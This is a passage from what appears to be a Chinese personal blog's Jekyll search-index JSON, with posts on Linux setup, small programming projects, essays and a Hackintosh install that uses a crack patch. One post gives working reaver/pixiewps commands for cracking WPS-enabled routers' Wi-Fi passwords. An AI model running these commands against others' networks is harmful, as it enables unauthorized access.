wqy-zenhei</code></li>\n      <li>输入法<br />\n使用iBus：<br />\nGNOME现在已经默认集成了IBus， 所以你只需要安装的输入法引擎并在Region &amp; Language 添加输入源。默认切换输入法的快捷键是 Super+space;<br />\n安装拼音：<code class=\"highlighter-rouge\">sudo pacman -Ss ibus-libpinyin</code><br />\n配置：<code class=\"highlighter-rouge\">ibus-setup</code><br />\n在.bashrc末尾中加入以下参数：\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>export GTK_IM_MODULE=ibus\nexport XMODIFIERS=@im=ibus\nexport QT_IM_MODULE=ibus\n</code></pre>\n        </div>\n      </li>\n    </ul>\n  </li>\n</ol>\n\n<p>祝你成功！</p>\n"
    } ,
  
    {
      "title"    : "XCH - 化学方程式配平程序",
      "category" : "",
      "tags"     : "项目, 编程",
      "url"      : "/jekyll/update/2017/03/12/XCH-%E5%8C%96%E5%AD%A6%E6%96%B9%E7%A8%8B%E5%BC%8F%E9%85%8D%E5%B9%B3%E7%A8%8B%E5%BA%8F.html",
      "date"     : "2017-03-12 16:24:00 +0800",
      "content"  : "<p>本软件遵守<a href=\"http://www.gnu.org/licenses/gpl.txt\">GPL协议</a>发布<br />\n本程序可以用来进行化学方程式配平，下载地址见About页面<br />\n下面将介绍软件使用的核心算法：</p>\n<blockquote>\n  <p>程序通过暴力搜索化学方程式的各个分子式的系数来求解，纯数学解决</p>\n</blockquote>\n\n<p>下面我们来看几组例子：</p>\n<ol>\n  <li><strong>H2O=H2+O2</strong> 化学方程式配平：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>[lexuge@localhost XCH]$ ./XCH\nXCH - Chemical Equation Balancer\nBy LEXUGE\nCopyright (2017-2017) LEXUGE\nThe software is using GPL(http://www.gnu.org/licenses/gpl.txt)\n------Input------\n输入有几种元素种类,几个分子式，等号左边，右边的分子式个数：\n2 3 1 2 //拥有两种元素：H和O；三个分子式：H2O，H2，O2；左边有一个分子式：H2O；右边有两个分子式：H2和O2\n输入每种元素包含的原子在方程式中各个分子式的个数：\n2 2 0 //H2O中拥有2两个H原子，H2中有2个，O2中没有\n1 0 2 //同上\n输入搜索最大值:\n100 //最大暴力搜索范围\n------Output------\n各分子式系数分别为：\n2 2 1\n</code></pre>\n    </div>\n  </li>\n  <li><strong>As2O3+Zn+HCl=AsH3+ZnCl2+H2O</strong> 化学方程式配平：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>[lexuge@localhost XCH]$ ./XCH\nXCH - Chemical Equation Balancer\nBy LEXUGE\nCopyright (2017-2017) LEXUGE\nThe software is using GPL(http://www.gnu.org/licenses/gpl.txt)\n------Input------\n输入有几种元素种类,几个分子式，等号左边，右边的分子式个数：\n5 6 3 3\n输入每种元素包含的原子在方程式中各个分子式的个数：\n2 0 0 1 0 0\n3 0 0 0 0 1\n0 1 0 0 1 0\n0 0 1 3 0 2\n0 0 1 0 2 0\n输入搜索最大值:\n50\n------Output------\n各分子式系数分别为：\n1 6 12 2 6 3\n</code></pre>\n    </div>\n  </li>\n</ol>\n"
    } ,
  
    {
      "title"    : "普法战争",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2017/03/05/%E6%99%AE%E6%B3%95%E6%88%98%E4%BA%89%E6%84%9F%E6%82%9F.html",
      "date"     : "2017-03-05 11:32:00 +0800",
      "content"  : "<blockquote>\n  <p>普法战争是欧洲传统意义上的一场新旧帝国之争，决定着欧洲的霸主是谁的问题。<br />\n这场战争的成因并不是法国的主动进攻，很大一部分是德国（普鲁士）制造争端。德国人希望以此团结德意志名族。<br />\n最终法国以失败告终，德国人甚至不满足于法国皇帝的投降。</p>\n</blockquote>\n\n<ol>\n  <li>法国人为什么会失去这场战争？这场战争对于法国人能产生什么反思？<br />\n我们不妨从《最后一课》来分析。文中，小弗朗士在平常十分贪玩，经常迟到。韩麦尔先生身为一名教师，也经常不履行职务，上课拖沓迭代，还经常旷课——出去钓鱼。<br />\n最有意思的细节是：铁匠华希特向小弗朗士喊：“用不着那么快呀，孩子，你反正是来得及赶到学校的！”。<br />\n若是学生贪玩，我们还可以解释，但是教师韩麦尔先生，铁匠也是如此不严谨。我们可以将其提升一个层次，认定为一种“民族的通病”。没有时间观念意味着拖泥带水，做事没有规矩。法国人做事拖泥带水，很多时候带着一种Romentic的情态。Romentic对于美好的事物来说是感性、适合且美好的，但对于很多客观、复杂且理性的事物来说是致命的——比如战争。</li>\n</ol>\n\n<p>感性意味着意识从虚无中，以自身方式延展的自然的，自由的，无规则的。无规则进一步的升华，就会产生严重的没有责任感。法国人感性，傅雷说过：“感悟快的人往往感悟不深。“，因此法国人浮于表面，缺乏责任感，没有担当。从而，法国人会有时间观念的缺陷，缺乏认真与专注。时间观念是对于战争无比重要的，法国人对这场战争的大败也就不难解释了。<br />\n最终，在割地赔款的时候，法国人才觉悟到这一切，但是，已经晚了。</p>\n\n<ol>\n  <li>我们能够从中得到什么启发？<br />\n我认为，这个问题可以变为：感性与理性，我们该如何把握？<br />\n事实上，我认为感性应该建立在理性的基础上，也可以作为理性判断的一种辅助。理性可以帮我们解决更本性的问题，让世界合理的存在与运转。然而感性很好的诠释了我们存在的意义——我们是人，要让这个世界变得美好！<br />\n所以，理性是世界的造物主，而感性，让是人与造物主之间的翻译者。</li>\n</ol>\n"
    } ,
  
    {
      "title"    : "在Linux上使用VMware安装OS X",
      "category" : "",
      "tags"     : "计算机技巧, Linux",
      "url"      : "/jekyll/update/2017/02/25/%E5%9C%A8Linux%E4%B8%8A%E4%BD%BF%E7%94%A8VMware%E5%AE%89%E8%A3%85OS-X.html",
      "date"     : "2017-02-25 22:56:00 +0800",
      "content"  : "<p><img src=\"/image/OS X启动.png\" alt=\"\" /><br />\n<img src=\"/image/OS X.png\" alt=\"\" /></p>\n\n<p><img src=\"/image/OS X关于.png\" alt=\"\" /></p>\n\n<blockquote>\n  <p>OS X一直以惊艳的外表，卓越的性能打动着人们。而人们却为价格望而却步，如何无风险地来安装一个稳定且高速的OS X呢？</p>\n</blockquote>\n\n<p><a href=\"/download/WMware-Hackintosh.zip\">VMware Player-Hackintosh组合包</a><br />\n<a href=\"https://drive.google.com/open?id=0B-PSijxodhB1YTRRcU1CMEI2OEE\">OS X系统(Google Drive)</a></p>\n\n<p>如何安装OS X，今天，我将手把手指导</p>\n<ol>\n  <li>安装VMware Player\n    <ul>\n      <li>首先以root身份安装组合包中的bundle文件</li>\n      <li>为VMware打补丁，以root身份执行以下命令\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>cd /usr/lib/vmware/modules/source\ncp /home/lexuge/下载/vmmon.tar .\ncp /home/lexuge/下载/vmmon.tar .\nvmware-modconfig --console --install-all\n</code></pre>\n        </div>\n      </li>\n      <li>安装Mac破解补丁<br />\n解压unlocker压缩包后以root身份执行lnx-install.sh<br />\n至此，VMware安装完成</li>\n    </ul>\n  </li>\n  <li>\n    <p>下载上面的安装镜像，请有耐心</p>\n  </li>\n  <li>安装OS X\n    <ul>\n      <li>新建一个虚拟机，选择稍后安装系统-OS X-存储虚拟硬盘为单文件</li>\n      <li>进入虚拟机设置，设置内存尽可能的大，CPU 4核，然后删除现有的虚拟硬盘，并添加一个虚拟硬盘(配置：SATA-然后选择下载的macOS Sierra 10.12 by wikigain.vmdk)</li>\n      <li>进入虚拟机，开始安装</li>\n    </ul>\n  </li>\n  <li>享受一切！</li>\n</ol>\n"
    } ,
  
    {
      "title"    : "为你，千千万万遍。",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2017/02/23/%E4%B8%BA%E4%BD%A0-%E5%8D%83%E5%8D%83%E4%B8%87%E4%B8%87%E9%81%8D.html",
      "date"     : "2017-02-23 18:17:00 +0800",
      "content"  : "<p>The Sound Of Silence: <audio src=\"/music/The Sound Of Silence.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n\n<p>灿烂千阳之中，你，我都追随着那只风筝。 ——题记<br />\n时间并不会冲去过去的事情，不论人们怎么说，这一定不会，也永远不会。往事，过错会不断地在你的脑海里重现，如同梦魇，挥之不去，无法逃离。<br />\n人，就是这样。</p>\n\n<p>我们永远且一定地生活在一个不完美，甚至糟糕的世界，我们永远存在犯错与赎罪的迷宫之间。阿米尔生活在一个被营造的美好世界中，但是，这个泡沫一经破灭，给予阿米尔的是巨大的落差与永远无法挽回的恐惧——时间并不能挽回。或许，哈桑的出生就意味着阿米尔一生中最大的救赎从此开始。<br />\n当哈桑要离开之时，阿米尔极其愧疚，可又陷入了人性的迷宫之中，沦落在哈桑侍从的一切中，让阿米尔成为了一个身陷内心困境不能自拔、失去自我的人。<br />\n小说从第十六章就开始就开始描写阿米尔的救赎，阿米尔从当初先是逃离，再到重返阿富汗，故事的背景中充斥着战争。正是战争的危险，阿米尔却不顾，冒死也要救出哈桑的儿子。无论如何，因为这是阿米尔最后的机会，一定要冒这个险。<br />\n阿米尔如同大多数孩子乃至成年人一般，被社会贴上了标签。人们当指出你的缺点时，你一定会极力改正这个问题，避免人们第二次对你说三道四，这也是典型的中国东方式的“塑造”，不同于西方的“挖掘”，“塑造”看的是你可以改正什么，而不是你有什么好的。这样久而久之的社会环境之下，你逐渐就会丧失你的优点，成为平庸之人，正如那句话：<strong>我们都变成了自己当初所讨厌的模样。</strong><br />\n感性有时比理性更重要，我们并不需要客观上的完美，只需要心灵上的无悔。我们必须承认，人性的缺失与丑恶,阿米尔对哈桑见而不救，我想，我们并不能就此断定他的无情。阿米尔为了这个错误，努力了终生，用他毕生的经历，来赎罪，只为完成心灵上的无悔，我们何不在当初就认真对待当下？这一切正如当初。</p>\n"
    } ,
  
    {
      "title"    : "Python有道词典终端版",
      "category" : "",
      "tags"     : "Python, Linux, 编程",
      "url"      : "/jekyll/update/2017/01/30/Python%E6%9C%89%E9%81%93%E8%AF%8D%E5%85%B8%E7%BB%88%E7%AB%AF%E7%89%88.html",
      "date"     : "2017-01-30 15:17:00 +0800",
      "content"  : "<p>为提高作业工作效力，我运用有道词典API与Python编写了一个小程序<br />\n输入英文，显示各种解释，直到输入<code class=\"highlighter-rouge\">lexuge</code>退出</p>\n\n<p>源代码：</p>\n<div class=\"language-python highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"c\">#!/usr/bin/env python  </span>\n<span class=\"c\"># -- coding: UTF-8 --</span>\n<span class=\"kn\">import</span> <span class=\"nn\">codecs</span>\n<span class=\"kn\">import</span> <span class=\"nn\">re</span>  \n<span class=\"kn\">import</span> <span class=\"nn\">urllib2</span>  \n<span class=\"kn\">import</span> <span class=\"nn\">re</span>  \n<span class=\"kn\">import</span> <span class=\"nn\">json</span>  \n<span class=\"kn\">import</span> <span class=\"nn\">sys</span>\n<span class=\"kn\">from</span> <span class=\"nn\">urllib</span> <span class=\"kn\">import</span> <span class=\"n\">quote</span>\n\n<span class=\"nb\">reload</span><span class=\"p\">(</span><span class=\"n\">sys</span><span class=\"p\">)</span>\n<span class=\"n\">sys</span><span class=\"o\">.</span><span class=\"n\">setdefaultencoding</span><span class=\"p\">(</span> <span class=\"s\">\"utf-8\"</span> <span class=\"p\">)</span>\n\n<span class=\"k\">class</span> <span class=\"nc\">Youdao</span><span class=\"p\">:</span>  \n    <span class=\"k\">def</span> <span class=\"nf\">__init__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>  \n        <span class=\"bp\">self</span><span class=\"o\">.</span><span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"s\">'http://fanyi.youdao.com/openapi.do'</span>  \n        <span class=\"bp\">self</span><span class=\"o\">.</span><span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"s\">'API KEY'</span>   \n        <span class=\"bp\">self</span><span class=\"o\">.</span><span class=\"n\">keyfrom</span> <span class=\"o\">=</span> <span class=\"s\">'keyfrom'</span>  \n\n    <span class=\"k\">def</span> <span class=\"nf\">get_translation</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">,</span><span class=\"n\">words</span><span class=\"p\">):</span>  \n        <span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"bp\">self</span><span class=\"o\">.</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"s\">'?keyfrom='</span> <span class=\"o\">+</span> <span class=\"bp\">self</span><span class=\"o\">.</span><span class=\"n\">keyfrom</span> <span class=\"o\">+</span> <span class=\"s\">'&amp;key='</span><span class=\"o\">+</span><span class=\"bp\">self</span><span class=\"o\">.</span><span class=\"n\">key</span> <span class=\"o\">+</span> <span class=\"s\">'&amp;type=data&amp;doctype=json&amp;version=1.1&amp;q='</span> <span class=\"o\">+</span> <span class=\"n\">quote</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">words</span><span class=\"p\">))</span>  \n        <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">urllib2</span><span class=\"o\">.</span><span class=\"n\">urlopen</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()</span>   \n        <span class=\"n\">json_result</span> <span class=\"o\">=</span> <span class=\"n\">json</span><span class=\"o\">.</span><span class=\"n\">loads</span><span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span>  \n        <span class=\"k\">try</span> <span class=\"p\">:</span>\n            <span class=\"n\">json_result2</span> <span class=\"o\">=</span> <span class=\"n\">json_result</span><span class=\"p\">[</span><span class=\"s\">\"basic\"</span><span class=\"p\">]</span>\n\n        <span class=\"k\">except</span> <span class=\"p\">:</span>\n            <span class=\"k\">pass</span>    \n        <span class=\"k\">try</span> <span class=\"p\">:</span>\n            <span class=\"n\">json_result3</span> <span class=\"o\">=</span> <span class=\"n\">json_result2</span><span class=\"p\">[</span><span class=\"s\">\"uk-phonetic\"</span><span class=\"p\">]</span>\n\n        <span class=\"k\">except</span> <span class=\"p\">:</span>\n            <span class=\"k\">pass</span>\n        <span class=\"k\">try</span> <span class=\"p\">:</span>\n            <span class=\"n\">json_result</span> <span class=\"o\">=</span> <span class=\"n\">json_result</span><span class=\"p\">[</span><span class=\"s\">\"translation\"</span><span class=\"p\">]</span>\n\n        <span class=\"k\">except</span> <span class=\"p\">:</span>\n            <span class=\"k\">pass</span>\n        <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"n\">json_result</span><span class=\"p\">:</span>  \n            <span class=\"k\">print</span> <span class=\"s\">u'翻译:'</span><span class=\"o\">+</span><span class=\"n\">i</span>  \n        <span class=\"k\">try</span> <span class=\"p\">:</span>\n            <span class=\"k\">print</span> <span class=\"s\">u'英式发音:'</span><span class=\"o\">+</span><span class=\"n\">json_result3</span>\n        <span class=\"k\">except</span> <span class=\"p\">:</span>\n            <span class=\"k\">pass</span>\n        <span class=\"k\">try</span> <span class=\"p\">:</span>\n            <span class=\"k\">print</span> <span class=\"s\">u'解释:'</span><span class=\"o\">+</span><span class=\"n\">json_result2</span><span class=\"p\">[</span><span class=\"s\">\"explains\"</span><span class=\"p\">][</span><span class=\"mi\">0</span><span class=\"p\">]</span>  \n        <span class=\"k\">except</span> <span class=\"p\">:</span>\n            <span class=\"k\">pass</span>\n\n\n<span class=\"n\">youdao</span> <span class=\"o\">=</span> <span class=\"n\">Youdao</span><span class=\"p\">()</span>  \n<span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>\n    <span class=\"k\">print</span> <span class=\"s\">'</span><span class=\"se\">\\n</span><span class=\"s\">'</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"n\">msg</span><span class=\"o\">=</span><span class=\"nb\">raw_input</span><span class=\"p\">(</span><span class=\"s\">u'输入你要翻译的单词,输入lexuge退出:'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"k\">if</span> <span class=\"n\">msg</span> <span class=\"o\">==</span> <span class=\"s\">'lexuge'</span><span class=\"p\">:</span>  \n        <span class=\"k\">break</span>  \n    <span class=\"n\">youdao</span><span class=\"o\">.</span><span class=\"n\">get_translation</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">)</span>  \n</code></pre>\n</div>\n\n<p>Tips:2017-3-5日更新:支持中英互译</p>\n"
    } ,
  
    {
      "title"    : "reaver破解Wi-Fi密码",
      "category" : "",
      "tags"     : "网络, Linux",
      "url"      : "/jekyll/update/2016/12/31/reaver%E7%A0%B4%E8%A7%A3Wi-Fi%E5%AF%86%E7%A0%81.html",
      "date"     : "2016-12-31 17:35:00 +0800",
      "content"  : "<p><a href=\"https://github.com/t6x/reaver-wps-fork-t6x\">reaver最新版主页</a><br />\n<a href=\"https://github.com/wiire/pixiewps\">pixiewps主页</a><br />\n<a href=\"https://lexuge.github.io/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html\">mdk3攻击路由器</a><br />\n借助最新的工具reaver可以破解WPA/WPA2（带有WPS）的路由器</p>\n<ol>\n  <li>编译reaver\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>git clone https://github.com/t6x/reaver-wps-fork-t6x\ncd reaver-wps-fork-t6x*/\ncd src/\n./configure\nmake\nsudo make install\n</code></pre>\n    </div>\n  </li>\n  <li>编译pixiewps\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>git clone https://github.com/wiire/pixiewps\ncd pixiewps*/\ncd src/\nmake\nsudo make install\n</code></pre>\n    </div>\n  </li>\n  <li>使用reaver<br />\n使用<code class=\"highlighter-rouge\">reaver -h</code>可显示帮助\n    <ul>\n      <li>使网卡变为监听模式:<code class=\"highlighter-rouge\">sudo airmon-ng start wlp2s0</code>(具体步骤见mdk3攻击路由器的前几步)</li>\n      <li>搜索附近路由:<code class=\"highlighter-rouge\">sudo airodump-ng wlp2s0mon</code><br />\n接下来就可以使用reaver了<br />\n若要在几秒钟内瞬间得到密码(不保证适应全部路由):<code class=\"highlighter-rouge\">reaver -i wlp2s0mon -b (MAC) -vvv -K 1</code><br />\n若要100%得到密码(几个小时以上):<code class=\"highlighter-rouge\">reaver -i wlp2s0mon -b (MAC)</code><br />\nTip:得到密码后一定要记下PIN，这样下次就可以直接获得密码(对方不更改PIN)</li>\n    </ul>\n  </li>\n</ol>\n"
    } ,
  
    {
      "title"    : "LEDIT及EDIT简述",
      "category" : "",
      "tags"     : "项目, 编程",
      "url"      : "/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0.html",
      "date"     : "2016-12-22 19:40:00 +0800",
      "content"  : "<p><strong>LEDIT及EDIT简述</strong><br />\n<img src=\"/image/LEDIT宣传.png\" alt=\"\" /></p>\n\n<p>EDIT是LEXUGE用C语言制作的一款命令行文本编辑软件，目前功能简单<br />\nLEDIT是LEXUGE在Linux下用纯C制作，不依赖任何非标准函数库的终端文本编辑软件，功能与EDIT一样<br />\n上述两款软件全部遵守<a href=\"http://www.gnu.org/licenses/gpl.txt\">GPL协议</a>(以本文所述作为最后实际有效话语)<br />\n两个版本书写的文档基本兼容</p>\n\n<p>下面是帮助：</p>\n<ul>\n  <li>使用上，下，左，右键来移动光标</li>\n  <li>使用Ctrl+w保存文件</li>\n  <li>使用Ctrl+r打开文件</li>\n  <li>使用ESC来退出(LEDIT需要两次ESC)</li>\n  <li>在加密文件时，请记住您输入的数字，在下次打开同一个文件时，请输入这个数字以解密</li>\n  <li>在打开文件时，请确保文件没有制表符(Tab)</li>\n  <li>当文件小范围损坏时，请以非LEDIT文件的选项打开尝试恢复到正确格式</li>\n</ul>\n\n<p>Copyright (“2015-2016”) LEXUGE</p>\n\n<p>Tips:在使用LEDIT编辑EDIT的文件时，请先使用<code class=\"highlighter-rouge\">dos2unix</code>命令来转换格式，在使用EDIT编辑LEDIT时，请在Linux平台先用<code class=\"highlighter-rouge\">unix2dos</code>来转换格式</p>\n"
    } ,
  
    {
      "title"    : "GAMEOX详述",
      "category" : "",
      "tags"     : "项目, 编程",
      "url"      : "/jekyll/update/2016/12/17/GAMEOX%E8%AF%A6%E8%BF%B0.html",
      "date"     : "2016-12-17 13:39:00 +0800",
      "content"  : "<p><strong>GAMEOX详述</strong><br />\nCopyright (“2015-2017”) LEXUGE<br />\nThe software is using <a href=\"http://www.gnu.org/licenses/gpl.txt\">GPL</a></p>\n\n<p>本软件是游戏“奥塞罗”的电子版<br />\n游戏规则:</p>\n<ul>\n  <li>首先选定棋盘大小，以及“O”方，“X”方谁先下</li>\n  <li>软件会将棋盘初始化为四个角双方各有2枚棋子</li>\n  <li>在下棋时，遵守以下规定：</li>\n  <li>下子的地方必须是现存在己方棋子的前后左右</li>\n  <li>当下完这颗子后，周围八格的敌方棋子全变为己方</li>\n  <li>当棋盘被占满时，“O”，“X”双方谁存在的棋子多为胜利</li>\n</ul>\n\n<p>2017-02-17 重大版本更新！GAMEOX采用最新智能判断算法，在一方无法下子的情况下自动计算胜负！另外，最新版为Linux版，Windows版已被删除，有需要请更改后源码编译</p>\n\n<p>2017-02-17 重大版本更新！GAMEOX加入最新AI算法，可进行局部最优决策，在短期可控范围内可达到最优解！</p>\n"
    } ,
  
    {
      "title"    : "神奇动物在哪里",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2016/11/27/%E7%A5%9E%E5%A5%87%E5%8A%A8%E7%89%A9%E5%9C%A8%E5%93%AA%E9%87%8C.html",
      "date"     : "2016-11-27 13:43:00 +0800",
      "content"  : "<p><img src=\"/image/神奇动物在哪里海报.jpg\" alt=\"\" /></p>\n\n<blockquote>\n  <p>街上反常地下着大雨。我撑起伞，行走在街上。不知未何,手紧紧地握着伞柄。生怕被雨淋湿,忘却了刚才的一\n切奇妙经历……<br />\n仿佛一切都是真实的。纽约的街上奔逃着各样的神奇生物，纽特紧张幽默得追回一只又一只逃窜的神奇生物。</p>\n</blockquote>\n\n<p>影片运用成熟的英式黑色幽默配以Rowling广至遮天，高至登天的超强想象力，从细节到宏观都面面具到，给人以超\n越《哈利波特》系列的震撼。与《哈利波特》不同的是，Rowling专门为这部电影改编了剧本。可以说，剧本是Rowl\ning专门为电影编写的。更能给予人真实感。</p>\n\n<p>纽特为了拯救与寻找默默然附体的克雷登斯，来到了地铁站。纽特略带恳求地看着铁轨上的克雷登斯：“我能过来吗？”\n克雷登斯冷眼看去，眼里带着孤独与防备。显然，可以看出他已经被深深的伤害过，无论是心灵还是肉体。他并没有回\n答纽特。纽特缓步走去。克雷登斯有些不耐烦，或许心生戒备，眼看就要变成默默然。这时，后方传来一声甜美的女声\n“克雷登斯”。终于，克雷登斯平静了下来。那是蒂娜的声音。纽特让蒂娜继续安抚克雷登斯。很快，他平复了所以的情\n绪。好景不长，帕西瓦尔来了。傲罗部长明显的几句话刺痛了克雷登斯的内心。蒂娜慌张地安抚着，可这已没有多大用\n处了。帕西瓦尔紧接着用魔咒电击着纽特。克雷登斯似乎越发愤怒地看着帕西瓦尔。终于，几乎在刹那间——克雷登斯\n化为默默然如风暴般席卷了整个地铁站。帕西瓦尔也略发害怕之色。可就在这时MCUSA的全体成员几乎都来到了这。\n主席命令杀死默默然。在千万魔杖地攻击下，默默然——克雷思登死了。最后疑虑灰烬飘出了地铁口……</p>\n"
    } ,
  
    {
      "title"    : "ev3dev蓝牙联网",
      "category" : "",
      "tags"     : "Linux, 计算机技巧",
      "url"      : "/jekyll/update/2016/11/13/ev3dev%E8%93%9D%E7%89%99%E8%81%94%E7%BD%91.html",
      "date"     : "2016-11-13 15:01:00 +0800",
      "content"  : "<p><a href=\"http://www.ev3dev.org/docs/tutorials/connecting-to-the-internet-via-bluetooth/\">官网原版教程</a><br />\nev3dev是一款优秀的基于Debian的ev3下的Linux系统。是程序员的利器。</p>\n\n<p>对于原版教程，做如下补充:</p>\n<ul>\n  <li>ev3dev与Linux蓝牙配对时，要用ev3搜索、配对</li>\n  <li>Linux端的蓝牙本地服务IP地址一定要填写<code class=\"highlighter-rouge\">10.42.0.1</code></li>\n  <li>不要自动连接</li>\n</ul>\n"
    } ,
  
    {
      "title"    : "ArchLinux下安装QQ",
      "category" : "",
      "tags"     : "Linux, 计算机技巧",
      "url"      : "/jekyll/update/2016/11/06/ArchLinux%E4%B8%8B%E5%AE%89%E8%A3%85QQ.html",
      "date"     : "2016-11-06 15:45:00 +0800",
      "content"  : "<p>QQ一直是Linux用户的一个难题<br />\n今天我们就叫大家使用Longene WINE QQ来实现QQ的使用<br />\n<a href=\"http://www.longene.org/download/WineQQ7.8-20151109-Longene.deb\">wine QQ deb包下载</a><br />\n下载了deb包后，打开，将data.tar.gz压缩包解压出来，再将data.tar.gz压缩包解压<br />\n完成后得到/opt和/usr目录</p>\n<ul>\n  <li>把/opt/下的logene 文件夹 移动到系统/opt/下</li>\n  <li>在把 usr/bin/下的 qq 移动到你的系统 /usr/bin下</li>\n</ul>\n\n<p>完毕后进行测试：</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sh /opt/longene/qq/qq.sh\n</code></pre>\n</div>\n<p>帐号密码都能输入，不存在常规wine下安装qq 无法输入的问题，能正常聊天和文件传输，比较稳定！</p>\n"
    } ,
  
    {
      "title"    : "人",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2016/10/04/%E4%BA%BA.html",
      "date"     : "2016-10-04 16:10:00 +0800",
      "content"  : "<ul>\n  <li>\n    <p>纠正<br />\n很多时候，生活中总有人会提出我们看来亦或愚蠢亦或无知乃至无可救药的想法、意见。<br />\n本能总会趋势我们去纠正他的观点。何必呢？世界上，宇宙中，有多少人会提出愚蠢无知无可救药的想法，何必理会之？<br />\n再者，难道我们的观点一定正确？何必当这个可能传达错误思想的“传教士”？</p>\n  </li>\n  <li>\n    <p>人脉<br />\n朋友，重要亦或不重要。<br />\n只有在你需要时渴望，当你不危急时，这个朋友真的需要吗？<br />\n没有朋友的，别傻了！即使一个朋友在危难之时伸出援助之手，有何尝不是为了下次你对他的雪中送炭？<br />\n你真的需要朋友吗？</p>\n  </li>\n  <li>\n    <p>才艺<br />\n所有的艺人，演员，事实上都没有为社会作出过任何贡献，但因为审美需要，我们需要他们。<br />\n而你们学艺术干什么？你们难道尽靠所谓的”梦想“就想倚仗这些世俗烂摊亦或自学成才？<br />\n的确，人渣变成精英需要经过这个阶段，可是，人家是为了艺术本身。而你呢?是为了博取人渣羡慕的目光。<br />\n社会需要精英，同样也需要人渣，不要自为人渣还盲目向成为精英。</p>\n  </li>\n</ul>\n"
    } ,
  
    {
      "title"    : "RSA密钥生成（C语言）",
      "category" : "",
      "tags"     : "C, 编程",
      "url"      : "/jekyll/update/2016/10/01/RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90-C%E8%AF%AD%E8%A8%80.html",
      "date"     : "2016-10-01 09:43:00 +0800",
      "content"  : "<blockquote>\n  <p>RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年首次公布，当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。\nRSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。\n今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战。\nRSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。</p>\n</blockquote>\n\n<p>下面是代码实现</p>\n\n<div class=\"language-c highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"cp\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n</span>\n<span class=\"kt\">int</span> <span class=\"n\">start</span><span class=\"p\">();</span>\n<span class=\"kt\">int</span> <span class=\"n\">f</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">m</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">);</span>\n<span class=\"kt\">int</span> <span class=\"n\">prime</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">);</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">prime</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">2</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">*</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">n</span><span class=\"o\">%</span><span class=\"n\">i</span><span class=\"o\">==</span><span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n<span 